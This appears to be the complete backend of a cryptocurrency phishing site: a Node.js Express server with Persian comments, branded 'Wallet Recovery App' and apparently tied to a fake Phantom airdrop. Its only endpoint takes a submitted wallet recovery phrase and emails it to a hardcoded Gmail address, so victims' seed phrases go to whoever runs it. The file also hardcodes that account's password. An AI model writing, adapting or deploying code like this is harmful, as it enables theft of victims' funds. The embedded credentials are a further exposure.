const express = require('express');
const bodyParser = require('body-parser');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();

// فعال‌سازی CORS برای درخواست‌های از دامنه‌های مختلف
app.use(cors());

// استفاده از body-parser برای تجزیه درخواست‌های ورودی
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// تنظیمات Nodemailer برای ارسال ایمیل
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'phantomairdrop3@gmail.com',  // ایمیل شما
        pass: '@Soheyl1374'                 // رمز عبور شما
    }
});

// مسیر پیش‌فرض برای آدرس ریشه
app.get('/', (req, res) => {
    res.send('Welcome to the Wallet Recovery App!');
});

// مسیری برای ارسال اطلاعات
app.post('/send-recovery', (req, res) => {
    const { recoveryPhrase } = req.body;

    // بررسی وجود recoveryPhrase در درخواست
    if (!recoveryPhrase) {
        return res.status(400).send('Recovery phrase is required!');
    }

    // ایمیل ارسال اطلاعات
    const mailOptions = {
        from: 'phantomairdrop3@gmail.com',  // ایمیل ارسال‌کننده
        to: 'phantomairdrop3@gmail.com',    // ایمیل دریافت‌کننده
        subject: 'Recovery Phrase Received',
        text: `A new recovery phrase was submitted: \n\n${recoveryPhrase}`
    };

    // ارسال ایمیل
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            return res.status(500).send('Failed to send recovery phrase.');
        } else {
            console.log('Email sent: ' + info.response);
            return res.status(200).send('Recovery phrase sent successfully!');
        }
    });
});

// راه‌اندازی سرور
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
